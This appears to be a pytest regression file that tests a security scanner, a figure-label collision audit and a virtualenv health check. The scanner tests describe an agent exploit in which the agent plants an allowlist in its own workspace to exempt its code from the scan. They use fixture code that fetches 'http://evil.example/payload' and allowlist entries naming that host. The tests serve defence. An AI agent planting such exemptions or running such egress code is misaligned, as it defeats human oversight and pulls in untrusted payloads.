"""v1.7.3 debt-payment regressions (three documented, previously-unfixed defects).

D1  B07 agent self-planted allowlist (CHANGELOG [1.7.1]): skill-mode agents
    can write an allowlist into their own workspace and hand it to the
    scanner via --allow.  security_scan must (a) refuse exemptions from an
    allowlist that resolves inside the agent-writable zone (SEC-012,
    BLOCKED) and (b) report planted allowlist files even when unused
    (SEC-108, WARN), without flagging ordinary prose files.

D2  A10 blind to recipe figures (CHANGELOG [1.7.1]): matplotlib/pdftocairo
    path-ize text, so the SVG <text> collision audit saw zero labels on
    every recipe figure.  A10 now consumes measured renderer bboxes
    (text_layout.json emitted by figure_recipes).  Acceptance: a figure
    with genuinely colliding long categorical labels must FAIL, a clean
    figure must PASS, and a figure with no auditable geometry must WARN
    instead of silently passing.

D3  Dangling .venv interpreter (real incident): `.venv/bin/python` was a
    symlink to an uninstalled conda interpreter, so REPRODUCE.md step 0
    died with a bare shell error.  ci_check must detect the broken link,
    explain the real cause (site-packages intact + exact fix), and treat
    "no .venv at all" (CI containers) as a normal PASS.

stdlib + pytest only; matplotlib is an existing project dependency.
"""

from __future__ import annotations

import importlib.util
import io
import os
import sys
from contextlib import redirect_stdout
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
PLOTTING_DIR = REPO_ROOT / "scripts" / "plotting"
if str(PLOTTING_DIR) not in sys.path:
    sys.path.insert(0, str(PLOTTING_DIR))


def _load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


secscan = _load("security_scan_v173", REPO_ROOT / "scripts" / "security_scan.py")
ci = _load("ci_check_v173", REPO_ROOT / "scripts" / "ci_check.py")

import figure_audit as fa  # noqa: E402  (conftest already put plotting on sys.path)


# ===========================================================================
# D1 — B07 self-planted allowlist (host-side provenance)
# ===========================================================================

EGRESS_SNIPPET = (
    "import requests\n"
    "requests.get(\"http://evil.example/payload\")\n"
)
BENIGN_SNIPPET = "import numpy as np\nprint(float(np.zeros(3).sum()))\n"


def _ids(rep: dict) -> set[str]:
    return {f["rule_id"] for f in rep["findings"]}


def _workspace(root: Path) -> Path:
    """A SciForge run workspace (`.sciforge/` is the zone marker)."""
    (root / ".sciforge").mkdir(parents=True, exist_ok=True)
    return root


def _script(root: Path, source: str, rel: str = "runs/Q001/experiments/train.py") -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(source, encoding="utf-8")
    return p


def _plant(path: Path, lines=("host:evil.example",)) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path


def test_planted_allowlist_passed_explicitly_is_blocked(tmp_path):
    """The ARC-Bench B07 exploit: agent writes the allowlist, then passes it."""
    ws = _workspace(tmp_path / "ws")
    allow = _plant(ws / "security_allowlist.txt")
    script = _script(ws, EGRESS_SNIPPET)
    rep = secscan.scan_file(script, allow)
    ids = _ids(rep)
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-012" in ids                  # untrusted source, exemptions refused
    assert "SEC-108" in ids                  # planted file reported
    assert "SEC-003" in ids                  # the exemption did NOT apply
    assert rep["allowlist_source"]["trusted"] is False
    assert Path(rep["allowlist_source"]["zone_root"]).resolve() == ws.resolve()
    assert rep["allowlist_source"]["entries_rejected"]


def test_planted_pattern_allowlist_is_blocked_too(tmp_path):
    ws = _workspace(tmp_path / "ws")
    allow = _plant(ws / "allow_list.conf", ["pattern:requests\\.get"])
    script = _script(ws, EGRESS_SNIPPET)
    rep = secscan.scan_file(script, allow)
    assert rep["verdict"] == secscan.BLOCKED
    assert {"SEC-012", "SEC-003"} <= _ids(rep)


def test_planted_allowlist_at_repo_root_found_from_nested_script(tmp_path):
    """The file sat at the REPO ROOT while the script lived 3 levels down."""
    ws = _workspace(tmp_path / "repo")
    _plant(ws / "security_allowlist.txt")
    script = _script(ws, BENIGN_SNIPPET,
                     rel="runs/Q001/experiments/deep/train.py")
    rep = secscan.scan_file(script, None)
    assert "SEC-108" in _ids(rep)
    assert rep["verdict"] == secscan.WARN
    assert "SEC-003" not in _ids(rep)        # benign script; only the plant fires


def test_trusted_allowlist_outside_workspace_still_exempts(tmp_path):
    ws = _workspace(tmp_path / "ws")
    script = _script(ws, EGRESS_SNIPPET)
    allow = _plant(tmp_path / "operator" / "allow.txt")
    rep = secscan.scan_file(script, allow)
    ids = _ids(rep)
    assert rep["verdict"] == secscan.WARN
    assert "SEC-003" not in ids              # operator allowlist DID apply
    assert "SEC-107" in ids
    assert "SEC-012" not in ids
    assert rep["allowlist_source"]["trusted"] is True


def test_symlink_into_workspace_is_untrusted(tmp_path):
    """A path outside the zone that resolves into it is still agent-writable."""
    ws = _workspace(tmp_path / "ws")
    target = _plant(ws / "planted.txt")
    link = tmp_path / "innocent-looking-allow.txt"
    try:
        os.symlink(target, link)
    except OSError:
        pytest.skip("symlinks unavailable on this platform")
    script = _script(ws, EGRESS_SNIPPET)
    rep = secscan.scan_file(script, link)
    assert rep["verdict"] == secscan.BLOCKED
    assert "SEC-012" in _ids(rep)
    assert rep["allowlist_source"]["trusted"] is False


def test_planted_allowlist_reported_even_when_unused(tmp_path):
    ws = _workspace(tmp_path / "ws")
    _plant(ws / "security_allowlist.txt")
    script = _script(ws, BENIGN_SNIPPET)
    rep = secscan.scan_file(script, None)
    assert rep["verdict"] == secscan.WARN
    assert "SEC-108" in _ids(rep)
    assert rep["security_events"]           # machine-readable event trail
    assert "SEC-003" not in _ids(rep)


def test_no_false_positive_on_unrelated_allowlist_named_files(tmp_path):
    """Prose docs whose NAME mentions allowlist are not allowlist files."""
    ws = _workspace(tmp_path / "ws")
    (ws / "allowlist_notes.txt").write_text(
        "We discussed the allowlist policy in the meeting.\n", encoding="utf-8")
    (ws / "allowed_hosts.md").write_text(
        "# Allowed hosts\n\nProse, not entries.\n", encoding="utf-8")
    script = _script(ws, BENIGN_SNIPPET)
    rep = secscan.scan_file(script, None)
    assert rep["verdict"] == secscan.PASS
    assert "SEC-108" not in _ids(rep)


def test_cli_untrusted_allowlist_exits_blocked(tmp_path):
    ws = _workspace(tmp_path / "ws")
    allow = _plant(ws / "security_allowlist.txt")
    script = _script(ws, EGRESS_SNIPPET)
    buf = io.StringIO()
    with redirect_stdout(buf):
        rc = secscan.main([str(script), "--allow", str(allow)])
    assert rc == secscan.EXIT_BLOCKED
    assert "UNTRUSTED" in buf.getvalue()


def test_self_test_still_green_after_provenance_layer():
    buf = io.StringIO()
    with redirect_stdout(buf):
        rc = secscan.run_self_test()
    assert rc == secscan.EXIT_OK
    assert "26/26" in buf.getvalue()


# ===========================================================================
# D2 — A10 measured text layout (recipe figures finally visible)
# ===========================================================================

def _fig():
    import matplotlib
    matplotlib.use("Agg")
    import matplotlib.pyplot as plt
    return plt


def _a10(rep):
    return [c for c in rep.checks if c["layer"] == "A10"]


def test_measured_overlapping_labels_fail_a10(tmp_path):
    """Known colliding figure (同一位置的两个文本) -> A10 FAIL."""
    plt = _fig()
    fig = plt.figure(figsize=(4, 3))
    fig.text(0.20, 0.50, "AAAAAAAAAA", fontsize=20)
    fig.text(0.21, 0.50, "BBBBBBBBBB", fontsize=20)
    manifest = fa.write_text_layout(fig, tmp_path)
    plt.close(fig)
    assert manifest is not None and manifest.is_file()
    rep = fa.Report()
    fa.audit_text_layout_manifest(tmp_path, rep)
    a10 = _a10(rep)
    assert any(c["status"] == "FAIL" for c in a10)
    assert any("measured text-overlap" in c["msg"] for c in a10)
    assert rep.suggested_fixes


def test_measured_separated_labels_pass_a10(tmp_path):
    plt = _fig()
    fig = plt.figure(figsize=(4, 3))
    fig.text(0.10, 0.85, "AAAAAAAAAA", fontsize=20)
    fig.text(0.10, 0.15, "BBBBBBBBBB", fontsize=20)
    fa.write_text_layout(fig, tmp_path)
    plt.close(fig)
    rep = fa.Report()
    fa.audit_text_layout_manifest(tmp_path, rep)
    assert [c["status"] for c in _a10(rep)] == ["PASS"]
    assert "measured labels" in _a10(rep)[0]["msg"]


def test_measured_touching_boxes_are_not_flagged(tmp_path):
    """Negative control: side-by-side labels that do not intersect must pass."""
    plt = _fig()
    fig = plt.figure(figsize=(6, 3))
    fig.text(0.05, 0.50, "LEFT", fontsize=20)
    fig.text(0.60, 0.50, "RIGHT", fontsize=20)
    fa.write_text_layout(fig, tmp_path)
    plt.close(fig)
    rep = fa.Report()
    fa.audit_text_layout_manifest(tmp_path, rep)
    assert all(c["status"] != "FAIL" for c in _a10(rep))


def test_recipe_long_categorical_labels_are_audited_and_clean(tmp_path):
    """The v1.7.1 auto-fit must be VISIBLE to A10, and the result clean."""
    import figure_recipes as fr
    spec = {
        "recipe": "bar-grouped", "size": "single",
        "x_label": "dataset (regime)", "y_label": "test RMSE",
        "groups": ["friedman1 low noise", "friedman1 high noise",
                   "diabetes regression", "breast cancer pca6",
                   "concrete strength", "energy efficiency"],
        "series": [{"name": "Tree", "values": [2.88, 31.30, 64.64, 12.1, 8.2, 3.3]}],
    }
    out = tmp_path / "out"
    fr.render(spec, out)
    assert (out / "text_layout.json").is_file()
    rep = fa.audit_figure(out)
    a10 = _a10(rep)
    assert a10, "A10 produced no check at all — the audit is blind again"
    assert not any(c["status"] == "FAIL" for c in a10), a10
    assert any("measured labels" in c["msg"] for c in a10)


def test_recipe_genuine_collision_fails_a10(tmp_path):
    """ACCEPTANCE: a recipe figure with known-colliding long labels FAILs.

    80 long categorical y labels in a single-column heatmap exceed what the
    engine's font-shrink floor can fit; the old SVG-<text> audit reported a
    vacuous PASS on exactly this kind of figure (ARC-Bench root cause).
    """
    import figure_recipes as fr
    n = 80
    spec = {
        "recipe": "heatmap", "size": "single", "colormap": "cividis",
        "matrix": [[float(i + j) for j in range(2)] for i in range(n)],
        "x_labels": ["A", "B"],
        "y_labels": [f"row {i:02d} long categorical label" for i in range(n)],
    }
    out = tmp_path / "out"
    fr.render(spec, out)
    assert (out / "text_layout.json").is_file()
    rep = fa.audit_figure(out)
    failures = [c for c in _a10(rep) if c["status"] == "FAIL"]
    assert failures, "A10 failed to see a deliberately colliding figure"
    assert "measured text-overlap" in failures[0]["msg"]


def test_a10_warns_when_no_geometry_is_auditable(tmp_path):
    """Silence is the bug: no SVG text and no manifest must WARN, not PASS."""
    from conftest import PDF_BYTES
    d = tmp_path / "fig"
    d.mkdir()
    (d / "output.pdf").write_bytes(PDF_BYTES)
    (d / "output.svg").write_text(
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
        '<path d="M0 0 L1 1"/></svg>', encoding="utf-8")
    (d / "latex_include.tex").write_text("\\includegraphics{output.pdf}\n")
    (d / "spec.tex").write_text("% source\n")
    rep = fa.audit_figure(d)
    msgs = [c for c in _a10(rep) if c["status"] == "WARN"]
    assert any("no auditable text geometry" in c["msg"] for c in msgs)


def test_manifest_unreadable_degrades_to_warn(tmp_path):
    (tmp_path / "text_layout.json").write_text("{not json", encoding="utf-8")
    rep = fa.Report()
    fa.audit_text_layout_manifest(tmp_path, rep)   # must not raise
    assert [c["status"] for c in _a10(rep)] == ["WARN"]


# ===========================================================================
# D3 — environment health (dangling .venv interpreter)
# ===========================================================================

def _abi() -> str:
    return "%d.%d" % sys.version_info[:2]


def test_no_venv_is_a_normal_pass(tmp_path):
    ok, msgs = ci.check_environment(tmp_path)
    assert ok
    assert any("no .venv" in m for m in msgs)


def test_broken_venv_symlink_fails_with_actionable_diagnosis(tmp_path):
    venv = tmp_path / ".venv"
    (venv / "bin").mkdir(parents=True)
    site = venv / f"lib/python{_abi()}/site-packages"
    site.mkdir(parents=True)
    (site / "numpy").mkdir()
    (site / "pytest").mkdir()
    os.symlink("/nonexistent/miniconda3/bin/python", venv / "bin/python")

    ok, msgs = ci.check_environment(tmp_path)
    text = "\n".join(msgs)
    assert not ok
    assert "BROKEN .venv interpreter symlink" in text
    assert "/nonexistent/miniconda3/bin/python" in text   # names the target
    assert "site-packages intact" in text                 # packages are fine
    assert "ln -sfn" in text                              # concrete fix
    assert "REPRODUCE.md" in text                         # the real consequence


def test_partial_venv_without_interpreter_fails(tmp_path):
    venv = tmp_path / ".venv"
    (venv / "bin").mkdir(parents=True)
    (venv / "pyvenv.cfg").write_text("home = /gone\n")
    ok, msgs = ci.check_environment(tmp_path)
    assert not ok
    assert any("interpreter is missing" in m for m in msgs)


def test_healthy_venv_passes(tmp_path):
    venv = tmp_path / ".venv"
    (venv / "bin").mkdir(parents=True)
    (venv / f"lib/python{_abi()}/site-packages").mkdir(parents=True)
    os.symlink(sys.executable, venv / "bin/python")
    ok, msgs = ci.check_environment(tmp_path)
    assert ok
    assert any("interpreter healthy" in m for m in msgs)


def test_abi_mismatch_fails(tmp_path):
    """A running interpreter whose lib/pythonX.Y is absent imports nothing."""
    venv = tmp_path / ".venv"
    (venv / "bin").mkdir(parents=True)
    (venv / "lib/python2.7/site-packages").mkdir(parents=True)
    os.symlink(sys.executable, venv / "bin/python")
    ok, msgs = ci.check_environment(tmp_path)
    assert not ok
    text = "\n".join(msgs)
    assert "must match the lib/pythonX.Y directory" in text
    assert f"python{_abi()}" in text


def test_plain_directory_named_venv_is_ignored(tmp_path):
    (tmp_path / ".venv").mkdir()
    ok, msgs = ci.check_environment(tmp_path)
    assert ok
    assert any("not a virtualenv" in m for m in msgs)


def test_repo_environment_is_healthy_or_absent():
    """The checked-out repo must pass its own environment contract."""
    ok, msgs = ci.check_environment(REPO_ROOT)
    assert ok, msgs